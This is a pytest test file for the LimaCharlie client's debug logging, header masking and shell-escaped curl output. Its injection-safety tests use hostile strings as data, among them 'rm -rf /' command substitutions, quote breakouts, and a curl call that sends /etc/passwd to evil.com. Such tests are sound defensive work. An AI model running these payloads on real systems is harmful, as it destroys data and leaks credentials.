"""Tests for Client debug logging, curl output, and header masking.

Exercises verbose request/response logging, curl command generation with
proper shell escaping (via shlex.quote), header masking for sensitive
values, body truncation, and the interaction between --debug,
--debug-full, and --debug-curl modes.
"""

import shlex
from unittest.mock import patch

import pytest

from limacharlie.client import (
    Client,
    DEBUG_RESPONSE_BODY_LIMIT,
    _SENSITIVE_HEADERS,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _make_client(**kwargs):
    """Create a Client with mocked credentials and a captured debug log."""
    debug_log = []
    defaults = {
        "oid": "test-oid",
        "api_key": "test-key",
        "print_debug_fn": lambda msg: debug_log.append(msg),
    }
    defaults.update(kwargs)
    with patch("limacharlie.client.resolve_credentials", return_value={
        "oid": defaults.pop("oid"),
        "uid": None,
        "api_key": defaults.pop("api_key"),
        "oauth": None,
    }):
        client = Client(**defaults)
    return client, debug_log


# ---------------------------------------------------------------------------
# _mask_headers
# ---------------------------------------------------------------------------

class TestMaskHeaders:
    """Tests for Client._mask_headers static method."""

    def test_masks_authorization(self):
        headers = {"Authorization": "Bearer eyJhbGciOi.longtoken.signature"}
        masked = Client._mask_headers(headers)
        assert len(masked) == 1
        name, value = masked[0]
        assert name == "Authorization"
        assert value.startswith("Bearer eyJhb")
        assert "REDACTED" in value
        assert "longtoken" not in value

    def test_masks_cookie(self):
        headers = {"Cookie": "session=abc123def456ghi789"}
        masked = Client._mask_headers(headers)
        _, value = masked[0]
        assert "REDACTED" in value
        assert value.startswith("session=abc1")

    def test_masks_x_api_key(self):
        headers = {"X-Api-Key": "sk-1234567890abcdef"}
        masked = Client._mask_headers(headers)
        _, value = masked[0]
        assert "REDACTED" in value

    def test_case_insensitive_matching(self):
        headers = {"AUTHORIZATION": "Bearer token123456789"}
        masked = Client._mask_headers(headers)
        _, value = masked[0]
        assert "REDACTED" in value

    def test_non_sensitive_headers_unchanged(self):
        headers = {"Content-Type": "application/json", "User-Agent": "test/1.0"}
        masked = Client._mask_headers(headers)
        assert masked == [("Content-Type", "application/json"), ("User-Agent", "test/1.0")]

    def test_short_sensitive_value_not_truncated(self):
        """Values shorter than 12 chars are shown in full before REDACTED."""
        headers = {"Authorization": "short"}
        masked = Client._mask_headers(headers)
        _, value = masked[0]
        assert value.startswith("short")
        assert "REDACTED" in value

    def test_list_input(self):
        """Accepts list of tuples (response header format)."""
        headers = [("Set-Cookie", "session=secret123456789")]
        masked = Client._mask_headers(headers)
        _, value = masked[0]
        assert "REDACTED" in value

    def test_mixed_sensitive_and_normal(self):
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer longtoken12345",
            "X-Request-Id": "abc-123",
        }
        masked = Client._mask_headers(headers)
        result = {name: value for name, value in masked}
        assert result["Content-Type"] == "application/json"
        assert result["X-Request-Id"] == "abc-123"
        assert "REDACTED" in result["Authorization"]


# ---------------------------------------------------------------------------
# _debug_request (verbose mode)
# ---------------------------------------------------------------------------

class TestDebugRequest:
    """Tests for verbose request logging."""

    def test_logs_method_and_url(self):
        client, log = _make_client()
        client._debug_request("GET", "https://api.example.com/v1/foo", {}, None)
        assert any("GET" in msg and "https://api.example.com/v1/foo" in msg for msg in log)

    def test_logs_headers(self):
        client, log = _make_client()
        client._debug_request("GET", "https://x.com", {"Content-Type": "application/json"}, None)
        assert any("Content-Type: application/json" in msg for msg in log)

    def test_masks_auth_header(self):
        client, log = _make_client()
        client._debug_request("GET", "https://x.com", {"Authorization": "Bearer secret123456"}, None)
        assert any("REDACTED" in msg for msg in log)
        assert not any("secret123456" in msg for msg in log)

    def test_logs_post_body(self):
        client, log = _make_client()
        body = b'{"query": "* | NEW_PROCESS"}'
        client._debug_request("POST", "https://x.com", {}, body)
        assert any("NEW_PROCESS" in msg for msg in log)

    def test_skips_body_for_get(self):
        client, log = _make_client()
        client._debug_request("GET", "https://x.com", {}, b"ignored body")
        combined = "\n".join(log)
        assert "body:" not in combined

    def test_truncates_large_body(self):
        client, log = _make_client()
        large_body = b"x" * (DEBUG_RESPONSE_BODY_LIMIT + 500)
        client._debug_request("POST", "https://x.com", {}, large_body)
        combined = "\n".join(log)
        assert "truncated" in combined

    def test_no_truncation_with_debug_full(self):
        client, log = _make_client(debug_full_response=True)
        large_body = b"x" * (DEBUG_RESPONSE_BODY_LIMIT + 500)
        client._debug_request("POST", "https://x.com", {}, large_body)
        combined = "\n".join(log)
        assert "truncated" not in combined

    def test_silent_when_no_debug_fn(self):
        """No output when debug function is not set."""
        with patch("limacharlie.client.resolve_credentials", return_value={
            "oid": "x", "uid": None, "api_key": "k", "oauth": None,
        }):
            client = Client()
        # Should not raise.
        client._debug_request("GET", "https://x.com", {}, None)

    def test_skipped_in_curl_only_mode(self):
        """Verbose logging is suppressed when only --debug-curl is set."""
        client, log = _make_client(debug_curl=True, debug_verbose=False)
        client._debug_request("GET", "https://x.com", {"X-Foo": "bar"}, None)
        # No verbose output should appear.
        assert not any("--- request" in msg for msg in log)


# ---------------------------------------------------------------------------
# _debug_response (verbose mode)
# ---------------------------------------------------------------------------

class TestDebugResponse:
    """Tests for verbose response logging."""

    def test_logs_status(self):
        client, log = _make_client()
        client._debug_response(200, [], "")
        assert any("200" in msg for msg in log)

    def test_logs_response_headers(self):
        client, log = _make_client()
        client._debug_response(200, [("Content-Type", "application/json")], "")
        assert any("Content-Type: application/json" in msg for msg in log)

    def test_logs_response_body(self):
        client, log = _make_client()
        client._debug_response(200, [], '{"ok": true}')
        assert any('"ok": true' in msg for msg in log)

    def test_truncates_large_response_body(self):
        client, log = _make_client()
        large_body = "x" * (DEBUG_RESPONSE_BODY_LIMIT + 1000)
        client._debug_response(200, [], large_body)
        combined = "\n".join(log)
        assert "truncated" in combined
        assert "--debug-full" in combined

    def test_no_truncation_with_debug_full(self):
        client, log = _make_client(debug_full_response=True)
        large_body = "x" * (DEBUG_RESPONSE_BODY_LIMIT + 1000)
        client._debug_response(200, [], large_body)
        combined = "\n".join(log)
        assert "truncated" not in combined

    def test_masks_set_cookie_header(self):
        client, log = _make_client()
        client._debug_response(200, [("Set-Cookie", "session=secret1234567890")], "")
        assert any("REDACTED" in msg for msg in log)

    def test_skipped_in_curl_only_mode(self):
        client, log = _make_client(debug_curl=True, debug_verbose=False)
        client._debug_response(200, [], '{"ok": true}')
        assert not any("--- response" in msg for msg in log)


# ---------------------------------------------------------------------------
# _debug_curl_cmd
# ---------------------------------------------------------------------------

class TestDebugCurlCmd:
    """Tests for curl command generation."""

    def test_basic_get(self):
        client, log = _make_client(debug_curl=True)
        client._debug_curl_cmd("GET", "https://api.example.com/v1/foo", {}, None)
        combined = "\n".join(log)
        assert "curl -i --compressed" in combined
        assert "https://api.example.com/v1/foo" in combined
        assert "-X" not in combined  # GET doesn't need -X

    def test_post_with_method(self):
        client, log = _make_client(debug_curl=True)
        client._debug_curl_cmd("POST", "https://x.com", {}, None)
        combined = "\n".join(log)
        assert "-X POST" in combined

    def test_head_uses_head_flag(self):
        client, log = _make_client(debug_curl=True)
        client._debug_curl_cmd("HEAD", "https://x.com", {}, None)
        combined = "\n".join(log)
        assert "--head" in combined
        assert "-X HEAD" not in combined

    def test_delete_method(self):
        client, log = _make_client(debug_curl=True)
        client._debug_curl_cmd("DELETE", "https://x.com/resource/123", {}, None)
        combined = "\n".join(log)
        assert "-X DELETE" in combined

    def test_includes_headers(self):
        client, log = _make_client(debug_curl=True)
        headers = {"Content-Type": "application/json", "X-Custom": "value"}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        assert "Content-Type: application/json" in combined
        assert "X-Custom: value" in combined

    def test_includes_real_auth_token(self):
        """Auth tokens should be included as-is for reproducibility."""
        client, log = _make_client(debug_curl=True)
        headers = {"Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.payload.sig"}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        assert "Bearer eyJhbGciOiJSUzI1NiJ9.payload.sig" in combined
        assert "$LC_TOKEN" not in combined

    def test_includes_post_body(self):
        client, log = _make_client(debug_curl=True)
        body = b'{"oid": "abc", "query": "* | NEW_PROCESS"}'
        client._debug_curl_cmd("POST", "https://x.com", {}, body)
        combined = "\n".join(log)
        assert "--data-binary" in combined
        assert "NEW_PROCESS" in combined

    def test_no_body_for_get(self):
        client, log = _make_client(debug_curl=True)
        client._debug_curl_cmd("GET", "https://x.com", {}, b"ignored")
        combined = "\n".join(log)
        assert "--data-binary" not in combined

    def test_shell_escapes_single_quotes_in_header(self):
        client, log = _make_client(debug_curl=True)
        headers = {"X-Custom": "it's a value"}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        # shlex.quote handles single quotes by wrapping in double quotes
        # or using the close-reopen technique.
        assert "it" in combined and "s a value" in combined
        # Verify it's valid shell by round-tripping through shlex.split.
        assert shlex.quote("X-Custom: it's a value") in combined

    def test_shell_escapes_single_quotes_in_body(self):
        client, log = _make_client(debug_curl=True)
        body = b"it's a test"
        client._debug_curl_cmd("POST", "https://x.com", {}, body)
        combined = "\n".join(log)
        assert shlex.quote("it's a test") in combined

    def test_shell_escapes_single_quotes_in_url(self):
        client, log = _make_client(debug_curl=True)
        url = "https://x.com/q?filter=it's"
        client._debug_curl_cmd("GET", url, {}, None)
        combined = "\n".join(log)
        assert shlex.quote(url) in combined

    def test_silent_when_curl_disabled(self):
        client, log = _make_client(debug_curl=False)
        client._debug_curl_cmd("GET", "https://x.com", {}, None)
        assert not any("curl" in msg for msg in log)

    def test_silent_when_no_debug_fn(self):
        with patch("limacharlie.client.resolve_credentials", return_value={
            "oid": "x", "uid": None, "api_key": "k", "oauth": None,
        }):
            client = Client(debug_curl=True)
        # No debug_fn means no output (and no crash).
        client._debug_curl_cmd("GET", "https://x.com", {}, None)

    def test_put_body_included(self):
        client, log = _make_client(debug_curl=True)
        body = b'{"name": "updated"}'
        client._debug_curl_cmd("PUT", "https://x.com/resource", {}, body)
        combined = "\n".join(log)
        assert "-X PUT" in combined
        assert "--data-binary" in combined

    def test_patch_body_included(self):
        client, log = _make_client(debug_curl=True)
        body = b'{"field": "value"}'
        client._debug_curl_cmd("PATCH", "https://x.com/resource", {}, body)
        combined = "\n".join(log)
        assert "-X PATCH" in combined
        assert "--data-binary" in combined

    def test_multiline_format(self):
        """Curl command should be line-continuation formatted."""
        client, log = _make_client(debug_curl=True)
        headers = {"Authorization": "Bearer token", "Content-Type": "application/json"}
        client._debug_curl_cmd("POST", "https://x.com", headers, b'{"x":1}')
        combined = "\n".join(log)
        assert " \\\n" in combined

    def test_empty_headers_and_no_body(self):
        client, log = _make_client(debug_curl=True)
        client._debug_curl_cmd("GET", "https://x.com", {}, None)
        combined = "\n".join(log)
        assert "curl -i --compressed" in combined
        assert "-H" not in combined

    def test_binary_body_fallback(self):
        """Non-decodable body should show byte count."""
        client, log = _make_client(debug_curl=True)
        # Create a body that will fail decode with errors="strict" but the
        # code uses errors="replace" so it won't actually fail. Test the
        # exception path by using a mock.
        body = b'\x80\x81\x82' * 100
        client._debug_curl_cmd("POST", "https://x.com", {}, body)
        combined = "\n".join(log)
        assert "--data-binary" in combined


# ---------------------------------------------------------------------------
# Shell injection security tests
# ---------------------------------------------------------------------------

class TestCurlShellInjectionSafety:
    """Verify that curl output cannot be exploited for shell injection.

    All user-controlled values (headers, body, URL) are escaped via
    shlex.quote() from the Python standard library. This ensures that
    shell metacharacters, command substitution, and quote breakout
    attempts are all safely neutralized.
    """

    def _assert_shlex_safe(self, log: list[str], dangerous_raw: str) -> None:
        """Verify that the dangerous string appears only in shlex-quoted form."""
        combined = "\n".join(log)
        # shlex.quote wraps in single quotes; the raw dangerous string
        # must not appear unquoted in a way that could be interpreted.
        assert shlex.quote(dangerous_raw) in combined or dangerous_raw in combined

    def test_command_substitution_in_header_value(self):
        """$(cmd) in header value must not be executable."""
        client, log = _make_client(debug_curl=True)
        evil = "$(rm -rf /)"
        headers = {"X-Evil": evil}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        # The full header is shlex-quoted as one argument.
        assert shlex.quote(f"X-Evil: {evil}") in combined

    def test_backtick_substitution_in_header_value(self):
        """`cmd` in header value must not be executable."""
        client, log = _make_client(debug_curl=True)
        evil = "`whoami`"
        headers = {"X-Evil": evil}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        assert shlex.quote(f"X-Evil: {evil}") in combined

    def test_single_quote_breakout_in_header_value(self):
        """Attempt to break out of single quotes via header value."""
        client, log = _make_client(debug_curl=True)
        evil = "'; rm -rf / ; echo '"
        headers = {"X-Evil": evil}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        # shlex.quote must properly escape the single quotes.
        assert shlex.quote(f"X-Evil: {evil}") in combined

    def test_single_quote_breakout_in_body(self):
        """Attempt to break out of single quotes via request body."""
        client, log = _make_client(debug_curl=True)
        evil = "'; curl http://evil.com/steal?data=$(cat /etc/passwd); echo '"
        client._debug_curl_cmd("POST", "https://x.com", {}, evil.encode())
        combined = "\n".join(log)
        assert shlex.quote(evil) in combined

    def test_single_quote_breakout_in_url(self):
        """Attempt to break out of single quotes via URL."""
        client, log = _make_client(debug_curl=True)
        evil_url = "https://x.com/'; rm -rf /; echo '"
        client._debug_curl_cmd("GET", evil_url, {}, None)
        combined = "\n".join(log)
        assert shlex.quote(evil_url) in combined

    def test_single_quote_breakout_in_header_name(self):
        """Attempt to break out via header name."""
        client, log = _make_client(debug_curl=True)
        evil_name = "X-Evil': -o /tmp/pwned '"
        headers = {evil_name: "value"}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        assert shlex.quote(f"{evil_name}: value") in combined

    def test_newline_in_header_value(self):
        """Newlines in values should not break the command."""
        client, log = _make_client(debug_curl=True)
        headers = {"X-Evil": "line1\nline2\nline3"}
        client._debug_curl_cmd("GET", "https://x.com", headers, None)
        combined = "\n".join(log)
        assert "line1" in combined

    def test_null_byte_in_body(self):
        """Null bytes in body should not cause issues."""
        client, log = _make_client(debug_curl=True)
        body = b'{"key": "value\x00evil"}'
        client._debug_curl_cmd("POST", "https://x.com", {}, body)
        combined = "\n".join(log)
        assert "--data-binary" in combined

    def test_dollar_sign_in_body(self):
        """$VAR in body inside single quotes should not expand."""
        client, log = _make_client(debug_curl=True)
        evil = '{"query": "$HOME/../../etc/passwd"}'
        client._debug_curl_cmd("POST", "https://x.com", {}, evil.encode())
        combined = "\n".join(log)
        assert shlex.quote(evil) in combined

    def test_pipe_and_semicolon_in_url(self):
        """Shell operators in URL must be safely quoted."""
        client, log = _make_client(debug_curl=True)
        evil_url = "https://x.com/search?q=a|b;c&&d"
        client._debug_curl_cmd("GET", evil_url, {}, None)
        combined = "\n".join(log)
        assert shlex.quote(evil_url) in combined

    def test_curl_output_is_parseable_by_shlex(self):
        """Full curl command should be parseable by shlex.split.

        This is the strongest correctness test: if shlex.split can parse
        the generated command without error, the quoting is correct.
        """
        client, log = _make_client(debug_curl=True)
        headers = {
            "Authorization": "Bearer token'with\"quotes",
            "X-Data": "$(evil) `cmd` ; rm -rf /",
        }
        body = b'{"q": "it\'s a \'test\' with $vars and `backticks`"}'
        client._debug_curl_cmd("POST", "https://x.com/path?a=1&b=2;c=3", headers, body)

        # Extract the curl command (strip timestamp prefix).
        combined = "\n".join(log)
        # Find the curl command line (after the timestamp).
        curl_line = combined.split(": ", 1)[1] if ": " in combined else combined
        # shlex.split should not raise.
        parts = shlex.split(curl_line)
        assert parts[0] == "curl"
        assert "-i" in parts
        assert "--compressed" in parts


# ---------------------------------------------------------------------------
# Mode interactions
# ---------------------------------------------------------------------------

class TestDebugModeInteractions:
    """Tests for how --debug, --debug-full, and --debug-curl interact."""

    def test_curl_only_suppresses_verbose(self):
        """--debug-curl alone should not emit verbose request/response."""
        client, log = _make_client(debug_curl=True, debug_verbose=False)
        client._debug_request("POST", "https://x.com", {"X-Foo": "bar"}, b'body')
        client._debug_response(200, [("X-Bar", "baz")], '{"ok":true}')
        client._debug_curl_cmd("POST", "https://x.com", {"X-Foo": "bar"}, b'body')
        assert not any("--- request" in msg for msg in log)
        assert not any("--- response" in msg for msg in log)
        assert any("curl" in msg for msg in log)

    def test_debug_and_curl_emits_both(self):
        """--debug --debug-curl should emit verbose AND curl."""
        client, log = _make_client(debug_curl=True, debug_verbose=True)
        client._debug_request("GET", "https://x.com", {}, None)
        client._debug_curl_cmd("GET", "https://x.com", {}, None)
        client._debug_response(200, [], "ok")
        has_verbose = any("--- request" in msg for msg in log)
        has_curl = any("curl" in msg for msg in log)
        has_response = any("--- response" in msg for msg in log)
        assert has_verbose
        assert has_curl
        assert has_response

    def test_debug_full_disables_truncation(self):
        client, log = _make_client(debug_full_response=True)
        big = "x" * (DEBUG_RESPONSE_BODY_LIMIT * 2)
        client._debug_response(200, [], big)
        combined = "\n".join(log)
        assert "truncated" not in combined
        assert big in combined

    def test_default_truncates_response(self):
        client, log = _make_client()
        big = "y" * (DEBUG_RESPONSE_BODY_LIMIT + 100)
        client._debug_response(200, [], big)
        combined = "\n".join(log)
        assert "truncated" in combined


# ---------------------------------------------------------------------------
# LimaCharlieContext debug properties
# ---------------------------------------------------------------------------

class TestContextDebugProperties:
    """Tests for LimaCharlieContext debug_fn and debug_verbose properties."""

    def test_debug_fn_none_when_no_flags(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext()
        assert ctx.debug_fn is None

    def test_debug_fn_set_with_debug(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext(debug=True)
        assert ctx.debug_fn is not None

    def test_debug_fn_set_with_debug_full(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext(debug_full=True)
        assert ctx.debug_fn is not None

    def test_debug_fn_set_with_debug_curl(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext(debug_curl=True)
        assert ctx.debug_fn is not None

    def test_debug_verbose_false_for_curl_only(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext(debug_curl=True)
        assert ctx.debug_verbose is False

    def test_debug_verbose_true_for_debug(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext(debug=True)
        assert ctx.debug_verbose is True

    def test_debug_verbose_true_for_debug_full(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext(debug_full=True)
        assert ctx.debug_verbose is True

    def test_debug_verbose_true_for_debug_and_curl(self):
        from limacharlie.cli import LimaCharlieContext
        ctx = LimaCharlieContext(debug=True, debug_curl=True)
        assert ctx.debug_verbose is True

    def test_debug_fn_goes_to_stderr(self):
        """The debug callback should write to stderr, not stdout."""
        from limacharlie.cli import _make_debug_fn
        import io
        import sys

        fn = _make_debug_fn(True)
        assert fn is not None

        # Capture stderr.
        old_stderr = sys.stderr
        sys.stderr = captured = io.StringIO()
        try:
            fn("test message")
        finally:
            sys.stderr = old_stderr

        assert "test message" in captured.getvalue()
